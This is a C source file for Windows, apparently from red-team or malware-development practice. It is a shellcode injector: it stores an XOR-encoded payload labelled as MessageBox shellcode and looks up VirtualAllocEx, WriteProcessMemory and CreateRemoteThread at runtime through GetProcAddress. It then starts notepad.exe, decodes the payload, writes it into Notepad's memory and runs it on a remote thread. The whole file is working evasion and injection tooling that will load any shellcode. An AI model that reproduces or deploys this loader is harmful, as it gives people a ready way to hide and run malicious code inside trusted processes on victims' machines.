#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <tlhelp32.h>

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0x9e, 0x20, 0xe0, 0x90, 0x84, 0x9e, 0x9d, 0x97, 0x89, 0xa4, 0x74, 0x61, 0x62, 0x29, 0x30, 0x35, 0x24, 0x33, 0x33, 0x3e, 0x29, 0x45, 0xa6, 0x4, 0x2a, 0xe3, 0x33, 0x14, 0x4a, 0x29, 0xe9, 0x3a, 0x79, 0x4a, 0x3c, 0xea, 0x30, 0x48, 0x5f, 0x3c, 0xff, 0x13, 0x32, 0x56, 0x29, 0x7b, 0xc3, 0x2b, 0x28, 0x25, 0x50, 0xbd, 0x3c, 0x50, 0xa2, 0xc4, 0x5d, 0x15, 0x8, 0x63, 0x4e, 0x48, 0x20, 0xb5, 0xbd, 0x6c, 0x23, 0x69, 0xa0, 0x96, 0x99, 0x33, 0x23, 0x39, 0x5f, 0x3c, 0xff, 0x33, 0x42, 0x56, 0xea, 0x36, 0x48, 0x29, 0x63, 0xb8, 0x5f, 0xff, 0xf4, 0xe9, 0x62, 0x68, 0x61, 0x3c, 0xf1, 0xa1, 0x16, 0x7, 0x29, 0x75, 0xa4, 0x31, 0x5c, 0xe3, 0x29, 0x6c, 0x4a, 0x25, 0xe9, 0x28, 0x41, 0x3d, 0x75, 0xb1, 0x81, 0x34, 0x29, 0x8b, 0xbd, 0x5f, 0x23, 0xe3, 0x55, 0xfc, 0x3c, 0x60, 0xb4, 0x25, 0x50, 0xbd, 0x3c, 0x50, 0xa2, 0xc4, 0x20, 0xb5, 0xbd, 0x6c, 0x23, 0x69, 0xa0, 0x4c, 0x94, 0x14, 0x93, 0x56, 0x2d, 0x77, 0x38, 0x45, 0x6a, 0x2d, 0x58, 0xa5, 0x1, 0xb7, 0x3a, 0x56, 0x25, 0xff, 0x34, 0x45, 0x2b, 0x69, 0xb1, 0x12, 0x4a, 0x20, 0xe9, 0x64, 0x29, 0x4a, 0x30, 0xea, 0x22, 0x74, 0x28, 0x75, 0xa4, 0x5f, 0x23, 0xe3, 0x65, 0xfc, 0x3c, 0x60, 0xb2, 0x29, 0x39, 0x35, 0x2c, 0x3f, 0x3b, 0x32, 0x20, 0x2c, 0x35, 0x38, 0x23, 0x32, 0x29, 0xf7, 0x98, 0x41, 0x23, 0x3a, 0x9e, 0x94, 0x2c, 0x20, 0x3b, 0x32, 0x5f, 0x3c, 0xff, 0x73, 0x8b, 0x21, 0x9e, 0x8b, 0x8b, 0x3c, 0x2b, 0xaf, 0xa0, 0x74, 0x74, 0x61, 0x62, 0x56, 0x29, 0xf9, 0xe1, 0x7b, 0x63, 0x68, 0x61, 0x4a, 0x38, 0xec, 0xe7, 0x5d, 0x60, 0x74, 0x74, 0x29, 0x53, 0xa1, 0x20, 0xce, 0x31, 0xe2, 0x34, 0x6f, 0x9e, 0xa1, 0xcf, 0x81, 0x7f, 0x42, 0x6b, 0x35, 0xce, 0xc7, 0xf7, 0xd5, 0xfc, 0x8b, 0xa1, 0x29, 0xe1, 0xac, 0x49, 0x48, 0x72, 0x1d, 0x68, 0xe8, 0x9a, 0x94, 0x1, 0x64, 0xd9, 0x2f, 0x72, 0x6, 0x1b, 0xb, 0x62, 0x31, 0x20, 0xfd, 0xae, 0x9e, 0xb7, 0x20, 0x8, 0x54, 0x12, 0x13, 0xd, 0x5, 0x41, 0x3f, 0x1d, 0x12, 0xf, 0x9, 0x15, 0x55, 0x74, 0x27, 0x3b, 0x38, 0x5b, 0x54, 0x39, 0x0, 0xe, 0x2c, 0x4, 0x2, 0x74};
unsigned int payload_len = sizeof(payload);

char key[] = "bhatta";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len){
    // initialize function pointers
    pVirtualAllocEx = (LPVOID (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
    pWriteProcessMemory = (BOOL (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *))GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
    pCreateRemoteThread = (HANDLE (WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateRemoteThread");
    XOR((char *) payload  , payload_len, key, sizeof(key));
    LPVOID pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

int main (void) {
    // The path of the Notepad executable
    const char* notepadPath = "C:\\Windows\\System32\\notepad.exe";

    // Start the process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        if (pi.hProcess != NULL) {
            Inject(pi.hProcess, payload, payload_len);
            CloseHandle(pi.hProcess);
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
    }
    else {
        // Failed to start the process
        printf("Failed to start Notepad.");
    }
}




